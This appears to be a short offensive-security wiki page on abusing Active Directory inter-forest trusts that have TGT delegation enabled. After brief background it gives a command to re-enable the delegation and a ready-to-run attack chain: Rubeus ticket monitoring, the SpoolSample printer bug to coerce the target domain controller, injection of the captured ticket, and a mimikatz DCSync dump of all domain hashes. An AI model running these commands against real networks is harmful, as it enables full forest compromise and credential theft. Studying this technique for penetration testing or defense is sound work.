# Abusing Inter-Forest trust with Enabled TGTDelegation

## Abusing Inter-Forest trust with Enabled TGTDelegation [t-ad-trusts-tgt_delegation]

In 2018 Will Schroeder found a way to compromise forests using unconstrained delegation.
In 2019, Microsoft issued two rounds of security advisories and updates. The first blocked TGT delegation for all new forest trusts, 
while the second blocked it for existing forest trust as well.

It is still can be enabled manually:
netdom.exe trust chudamax.com /domain:hpbank.local /EnableTGTDelegation:Yes


###  Forge a new ticket and add an extra SID



{% code overflow="wrap" %}
```bash
#Start monitoring for TGTs with rubeus:
Rubeus.exe monitor /interval:5 /filteruser:target-dc$

#Execute the printerbug to trigger the force authentication of the target DC to our machine
SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local

#Get the base64 captured TGT from Rubeus and inject it into memory:
Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>

#Dump the hashes of the target domain using mimikatz:
lsadump::dcsync /domain:external.forest.local /all

```
{% endcode %}

